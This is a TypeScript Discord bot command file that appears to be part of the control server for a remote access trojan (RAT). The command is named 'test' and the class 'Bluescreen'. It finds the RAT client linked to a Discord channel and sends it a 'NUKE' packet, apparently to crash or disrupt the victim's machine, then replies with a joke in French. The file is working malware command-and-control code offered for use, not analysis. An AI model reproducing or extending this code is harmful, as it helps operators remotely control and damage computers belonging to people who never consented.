import { ChatInputCommandInteraction, EmbedBuilder, PermissionsBitField } from "discord.js";
import Command from "../base/classes/Command";
import CustomClient from "../base/classes/CustomClient";
import Category from "../base/enums/Category";
import TcpPacket from "../base/classes/TcpPacket";
import Code from "../base/enums/Codes";

export default class Bluescreen extends Command {
    constructor(client: CustomClient) {
        super(client, {
            name: "test",
            description: "Test un ketru.",
            category: Category.Utilities,
            dm_permissions: false,
            default_member_permissions: PermissionsBitField.Flags.UseApplicationCommands,
            cooldown: 3,
            options: []
        });
    }

    async Execute(interaction: ChatInputCommandInteraction) {
        const channelId = interaction.channelId;
        if (!channelId)
            return interaction.reply({
                content: "Erreur: impossible de trouver l'ID du channel.",
                ephemeral: true
            })

        let RATClient;
        
        try {
            RATClient = await this.client.ratServer.getClientByChannelId(channelId);
        } catch (error) {}

        if (RATClient === undefined) {
            return interaction.reply({
                content: "Erreur: impossible de trouver le client. (Surement pas connecté)",
                ephemeral: true
            });
        }
        let packet = new TcpPacket(Code.NUKE, Buffer.from([0x01]));
        RATClient.send(packet);

        await interaction.reply({
            content: "oe c greg."
        });
    }
}